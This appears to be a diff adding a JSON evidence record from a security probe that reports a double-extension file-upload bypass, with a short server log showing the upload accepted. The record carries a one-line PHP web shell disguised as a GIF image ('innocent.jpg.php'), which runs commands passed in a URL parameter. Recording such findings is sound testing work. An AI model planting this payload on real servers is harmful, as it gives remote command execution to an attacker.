@@ -1,0 +1,19 @@
+{
+  "probe_id": "S_D_01",
+  "timestamp": "2026-06-26T01:23:36.874682",
+  "evidence": {
+    "vulnerability_type": "file_type_bypass",
+    "bypass_method": "double_extension_polyglot",
+    "exploit_payload": {
+      "filename": "innocent.jpg.php",
+      "file_content": "GIF89a<?php system($_GET['cmd']); ?>"
+    },
+    "upload_succeeded": true,
+    "content_type_detected_as": "image/jpeg",
+    "actual_file_type": "PHP code",
+    "severity": "high",
+    "affected_components": "文件上传验证模块",
+    "affected_users": "所有用户"
+  },
+  "log_snippet": "[2026-06-25 10:10:15] POST /api/upload\n[2026-06-25 10:10:15] Filename: innocent.jpg.php\n[2026-06-25 10:10:16] Extension check: .jpg - PASS (BAD!)\n[2026-06-25 10:10:16] Upload accepted\n[2026-06-25 10:10:17] File saved: /uploads/innocent.jpg.php"
+}
